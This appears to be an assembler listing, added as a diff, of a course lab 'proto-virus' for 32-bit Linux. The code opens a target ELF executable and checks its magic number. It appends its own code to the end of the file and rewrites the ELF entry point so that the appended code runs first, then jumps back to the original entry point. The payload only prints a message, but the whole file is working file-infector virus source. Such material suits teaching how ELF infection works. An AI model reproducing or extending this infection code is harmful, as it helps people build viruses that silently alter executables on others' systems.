@@ -1,0 +1,296 @@
+     1                                  %macro	syscall1 2
+     2                                  	mov	ebx, %2
+     3                                  	mov	eax, %1
+     4                                  	int	0x80
+     5                                  %endmacro
+     6                                  
+     7                                  %macro	syscall3 4
+     8                                  	mov	edx, %4
+     9                                  	mov	ecx, %3
+    10                                  	mov	ebx, %2
+    11                                  	mov	eax, %1
+    12                                  	int	0x80
+    13                                  	cmp eax, -1					;checking error
+    14                                  	jle	fail						; eax >= -1
+    15                                  		
+    16                                  %endmacro
+    17                                  
+    18                                  %macro  exit 1
+    19                                  	syscall1 1, %1
+    20                                  %endmacro
+    21                                  
+    22                                  %macro  write 3
+    23                                  	syscall3 4, %1, %2, %3
+    24                                  %endmacro
+    25                                  
+    26                                  %macro  read 3
+    27                                  	syscall3 3, %1, %2, %3
+    28                                  %endmacro
+    29                                  
+    30                                  %macro  open 3
+    31                                  	syscall3 5, %1, %2, %3
+    32                                  %endmacro
+    33                                  
+    34                                  %macro  lseek 3
+    35                                  	syscall3 19, %1, %2, %3
+    36                                  %endmacro
+    37                                  
+    38                                  %macro  close 1
+    39                                  	syscall1 6, %1
+    40                                  %endmacro
+    41                                  
+    42                                  %define	STK_RES	200
+    43                                  %define	RDWR	2
+    44                                  %define	SEEK_END 2
+    45                                  %define SEEK_SET 0
+    46                                  
+    47                                  %define ENTRY		24
+    48                                  %define PHDR_start	28
+    49                                  %define	PHDR_size	32
+    50                                  %define PHDR_memsize	20	
+    51                                  %define PHDR_filesize	16
+    52                                  %define	PHDR_offset	4
+    53                                  %define	PHDR_vaddr	8
+    54                                  %define ELFHDR_size 	52
+    55                                  %define ELFHDR_phoff	28
+    56                                  %define fd dword [ebp-4]
+    57                                  	global _start
+    58                                  
+    59                                  	section .text
+    60                                  _start:	
+    61 00000000 55                      	push	ebp
+    62 00000001 89E5                    	mov	ebp, esp
+    63 00000003 81ECC8000000            	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+    64                                  	;CODE START
+    65                                  	open_file:
+    66                                  		open FileName, RDWR, 0777	; eax = open(filename, read|write, permissions for everywhere);
+    66                              <1>  syscall3 5, %1, %2, %3
+    66 00000009 BA09030000          <2>  mov edx, %4
+    66 0000000E B902000000          <2>  mov ecx, %3
+    66 00000013 BB[F0010000]        <2>  mov ebx, %2
+    66 00000018 B805000000          <2>  mov eax, %1
+    66 0000001D CD80                <2>  int 0x80
+    66 0000001F 83F8FF              <2>  cmp eax, -1
+    66 00000022 0F8E61010000        <2>  jle fail
+    66                              <2> 
+    67 00000028 8945FC                  		mov fd, eax				;eax = fd
+    68                                  
+    69                                  	compare_magic_numbers:
+    70                                  		read fd, ebp, 4			; eax = read first 4 bytes from fd to ebp;
+    70                              <1>  syscall3 3, %1, %2, %3
+    70 0000002B BA04000000          <2>  mov edx, %4
+    70 00000030 89E9                <2>  mov ecx, %3
+    70 00000032 8B5DFC              <2>  mov ebx, %2
+    70 00000035 B803000000          <2>  mov eax, %1
+    70 0000003A CD80                <2>  int 0x80
+    70 0000003C 83F8FF              <2>  cmp eax, -1
+    70 0000003F 0F8E44010000        <2>  jle fail
+    70                              <2> 
+    71 00000045 817D007F454C46          		cmp dword[ebp], 0x464C457F	; 0x464C457F is the magic number =ELF ?
+    72 0000004C 0F8537010000            		jne fail
+    73                                  
+    74                                  	save_previous_entry:
+    75                                  		lseek fd, 0x18, SEEK_SET			; using lseek to jump to entry location of entry point(offset 18 bytes)
+    75                              <1>  syscall3 19, %1, %2, %3
+    75 00000052 BA00000000          <2>  mov edx, %4
+    75 00000057 B918000000          <2>  mov ecx, %3
+    75 0000005C 8B5DFC              <2>  mov ebx, %2
+    75 0000005F B813000000          <2>  mov eax, %1
+    75 00000064 CD80                <2>  int 0x80
+    75 00000066 83F8FF              <2>  cmp eax, -1
+    75 00000069 0F8E1A010000        <2>  jle fail
+    75                              <2> 
+    76                                  		read fd, previous_entry_point, 4		; read the entry point and save it in a location predefined
+    76                              <1>  syscall3 3, %1, %2, %3
+    76 0000006F BA04000000          <2>  mov edx, %4
+    76 00000074 B9[04000000]        <2>  mov ecx, %3
+    76 00000079 8B5DFC              <2>  mov ebx, %2
+    76 0000007C B803000000          <2>  mov eax, %1
+    76 00000081 CD80                <2>  int 0x80
+    76 00000083 83F8FF              <2>  cmp eax, -1
+    76 00000086 0F8EFD000000        <2>  jle fail
+    76                              <2> 
+    77                                  
+    78                                  	infect:
+    79                                  		lseek fd, 0, SEEK_END				; SEEK_END is the end of file
+    79                              <1>  syscall3 19, %1, %2, %3
+    79 0000008C BA02000000          <2>  mov edx, %4
+    79 00000091 B900000000          <2>  mov ecx, %3
+    79 00000096 8B5DFC              <2>  mov ebx, %2
+    79 00000099 B813000000          <2>  mov eax, %1
+    79 0000009E CD80                <2>  int 0x80
+    79 000000A0 83F8FF              <2>  cmp eax, -1
+    79 000000A3 0F8EE0000000        <2>  jle fail
+    79                              <2> 
+    80 000000A9 89C6                    		mov esi, eax					; put the end location of the file in esi(which is the file
+    81                                  		write fd, virus_start, virus_end - virus_start	; write to the end of the given file all the code from "virus_start" (which is the code that prints the file)
+    81                              <1>  syscall3 4, %1, %2, %3
+    81 000000AB BA7B000000          <2>  mov edx, %4
+    81 000000B0 B9[C6010000]        <2>  mov ecx, %3
+    81 000000B5 8B5DFC              <2>  mov ebx, %2
+    81 000000B8 B804000000          <2>  mov eax, %1
+    81 000000BD CD80                <2>  int 0x80
+    81 000000BF 83F8FF              <2>  cmp eax, -1
+    81 000000C2 0F8EC1000000        <2>  jle fail
+    81                              <2> 
+    82                                  
+    83                                  	new_virtual_address:
+    84                                  		lseek fd, 0x3C, SEEK_SET			; location of virtual adress of text
+    84                              <1>  syscall3 19, %1, %2, %3
+    84 000000C8 BA00000000          <2>  mov edx, %4
+    84 000000CD B93C000000          <2>  mov ecx, %3
+    84 000000D2 8B5DFC              <2>  mov ebx, %2
+    84 000000D5 B813000000          <2>  mov eax, %1
+    84 000000DA CD80                <2>  int 0x80
+    84 000000DC 83F8FF              <2>  cmp eax, -1
+    84 000000DF 0F8EA4000000        <2>  jle fail
+    84                              <2> 
+    85                                  		read fd, ebp, 4					; read the virtual address
+    85                              <1>  syscall3 3, %1, %2, %3
+    85 000000E5 BA04000000          <2>  mov edx, %4
+    85 000000EA 89E9                <2>  mov ecx, %3
+    85 000000EC 8B5DFC              <2>  mov ebx, %2
+    85 000000EF B803000000          <2>  mov eax, %1
+    85 000000F4 CD80                <2>  int 0x80
+    85 000000F6 83F8FF              <2>  cmp eax, -1
+    85 000000F9 0F8E8A000000        <2>  jle fail
+    85                              <2> 
+    86 000000FF 037500                  		add esi, dword[ebp]				; program virtual address + file size = virus virtual address(end of file not including virus)
+    87 00000102 8935[08000000]          		mov dword[new_entry_point], esi			; saved the virtual address
+    88                                  
+    89                                  
+    90                                  	change_entry_point:
+    91                                  		lseek fd, 0x18, SEEK_SET		; using lseek to jump to entry location of entry point(offset 18 bytes)
+    91                              <1>  syscall3 19, %1, %2, %3
+    91 00000108 BA00000000          <2>  mov edx, %4
+    91 0000010D B918000000          <2>  mov ecx, %3
+    91 00000112 8B5DFC              <2>  mov ebx, %2
+    91 00000115 B813000000          <2>  mov eax, %1
+    91 0000011A CD80                <2>  int 0x80
+    91 0000011C 83F8FF              <2>  cmp eax, -1
+    91 0000011F 7E68                <2>  jle fail
+    91                              <2> 
+    92                                  		write fd, new_entry_point, 4		; overwrite the previous entry point
+    92                              <1>  syscall3 4, %1, %2, %3
+    92 00000121 BA04000000          <2>  mov edx, %4
+    92 00000126 B9[08000000]        <2>  mov ecx, %3
+    92 0000012B 8B5DFC              <2>  mov ebx, %2
+    92 0000012E B804000000          <2>  mov eax, %1
+    92 00000133 CD80                <2>  int 0x80
+    92 00000135 83F8FF              <2>  cmp eax, -1
+    92 00000138 7E4F                <2>  jle fail
+    92                              <2> 
+    93                                  		write 1, OutStr, 31				; print OutStr string
+    93                              <1>  syscall3 4, %1, %2, %3
+    93 0000013A BA1F000000          <2>  mov edx, %4
+    93 0000013F B9[FE010000]        <2>  mov ecx, %3
+    93 00000144 BB01000000          <2>  mov ebx, %2
+    93 00000149 B804000000          <2>  mov eax, %1
+    93 0000014E CD80                <2>  int 0x80
+    93 00000150 83F8FF              <2>  cmp eax, -1
+    93 00000153 7E34                <2>  jle fail
+    93                              <2> 
+    94                                  	set_variable_PreviousEntryPoint:
+    95                                  		lseek fd, -4, SEEK_END			; last 4 bytes in the virus is PreviousEntryPoint, we plan on changing it to the old entry point 
+    95                              <1>  syscall3 19, %1, %2, %3
+    95 00000155 BA02000000          <2>  mov edx, %4
+    95 0000015A B9FCFFFFFF          <2>  mov ecx, %3
+    95 0000015F 8B5DFC              <2>  mov ebx, %2
+    95 00000162 B813000000          <2>  mov eax, %1
+    95 00000167 CD80                <2>  int 0x80
+    95 00000169 83F8FF              <2>  cmp eax, -1
+    95 0000016C 7E1B                <2>  jle fail
+    95                              <2> 
+    96                                  		write fd, previous_entry_point, 4	; save the previous entry point at the PreviousEntryPoint
+    96                              <1>  syscall3 4, %1, %2, %3
+    96 0000016E BA04000000          <2>  mov edx, %4
+    96 00000173 B9[04000000]        <2>  mov ecx, %3
+    96 00000178 8B5DFC              <2>  mov ebx, %2
+    96 0000017B B804000000          <2>  mov eax, %1
+    96 00000180 CD80                <2>  int 0x80
+    96 00000182 83F8FF              <2>  cmp eax, -1
+    96 00000185 7E02                <2>  jle fail
+    96                              <2> 
+    97 00000187 EB27                    		jmp VirusExit						; exit
+    98                                  	    						
+    99                                  
+   100                                  	fail:
+   101                                  		write 2, Failstr, 12			; print FailStr string
+   101                              <1>  syscall3 4, %1, %2, %3
+   101 00000189 BA0C000000          <2>  mov edx, %4
+   101 0000018E B9[1E020000]        <2>  mov ecx, %3
+   101 00000193 BB02000000          <2>  mov ebx, %2
+   101 00000198 B804000000          <2>  mov eax, %1
+   101 0000019D CD80                <2>  int 0x80
+   101 0000019F 83F8FF              <2>  cmp eax, -1
+   101 000001A2 7EE5                <2>  jle fail
+   101                              <2> 
+   102                                  		close fd				;close file
+   102                              <1>  syscall1 6, %1
+   102 000001A4 8B5DFC              <2>  mov ebx, %2
+   102 000001A7 B806000000          <2>  mov eax, %1
+   102 000001AC CD80                <2>  int 0x80
+   103 000001AE EB00                    		jmp VirusExit					; exit
+   104                                  
+   105                                  
+   106                                  VirusExit:
+   107                                  	close fd
+   107                              <1>  syscall1 6, %1
+   107 000001B0 8B5DFC              <2>  mov ebx, %2
+   107 000001B3 B806000000          <2>  mov eax, %1
+   107 000001B8 CD80                <2>  int 0x80
+   108                                          exit 0            ; Termination if all is OK and no previous code to jump to
+   108                              <1>  syscall1 1, %1
+   108 000001BA BB00000000          <2>  mov ebx, %2
+   108 000001BF B801000000          <2>  mov eax, %1
+   108 000001C4 CD80                <2>  int 0x80
+   109                                                           ; (also an example for use of above macros)
+   110                                  
+   111                                  
+   112                                  virus_start:
+   113                                  	print_sucess: 	; because we are adding this to a file, we want to dynamically calculate the new address for the OutStr
+   114 000001C6 E86B000000              		call get_my_loc					; ecx = next_i's address
+   115 000001CB 83E93D                  		sub ecx, next_i-OutStr				; ecx = OutStr's address
+   116                                  		write 1, ecx, 31				; print OutStr string to stdout
+   116                              <1>  syscall3 4, %1, %2, %3
+   116 000001CE BA1F000000          <2>  mov edx, %4
+   116 000001D3 89C9                <2>  mov ecx, %3
+   116 000001D5 BB01000000          <2>  mov ebx, %2
+   116 000001DA B804000000          <2>  mov eax, %1
+   116 000001DF CD80                <2>  int 0x80
+   116 000001E1 83F8FF              <2>  cmp eax, -1
+   116 000001E4 7EA3                <2>  jle fail
+   116                              <2> 
+   117                                  	
+   118                                  	get_back_to_old_entry_point:
+   119 000001E6 E84B000000              		call get_my_loc					; ecx = next_i's address
+   120 000001EB 83E9FE                  		sub ecx, next_i-PreviousEntryPoint	; ecx = PreviousEntryPoint's address, this is where we saved the previous entry point (see line 95)
+   121 000001EE FF21                    		jmp [ecx]						; jump back to the previous entry point to run the code normally
+   122                                  
+   123                                  
+   124 000001F0 454C46657865633273-     FileName:	db "ELFexec2short", 0
+   124 000001F9 686F727400         
+   125 000001FE 546865206C61622039-     OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
+   125 00000207 2070726F746F2D7669-
+   125 00000210 72757320737472696B-
+   125 00000219 6573210A00         
+   126 0000021E 70657268617073206E-     Failstr:        db "perhaps not", 10 , 0
+   126 00000227 6F740A00           
+   127 0000022B 697420776F726B7321-     works_string: db "it works!", 10, 0
+   127 00000234 0A00               
+   128                                  	
+   129                                  get_my_loc:
+   130 00000236 E800000000              	call next_i
+   131                                  next_i:
+   132 0000023B 59                      	pop ecx
+   133 0000023C C3                      	ret	
+   134 0000023D [B0010000]              PreviousEntryPoint: dd VirusExit
+   135                                  virus_end:
+   136                                  
+   137                                  
+   138                                  
+   139                                  
+   140                                  section .bss			 ;uninitialized data segment
+   141 00000000 <res 00000004>          var: resd 1			;saves one double word of storage space in the BSS
+   142 00000004 <res 00000004>          previous_entry_point: resd 1    ;saves one double word of storage space in the BSS
+   143 00000008 <res 00000004>          new_entry_point: resd 1 	;saves one double word of storage space in the BSS
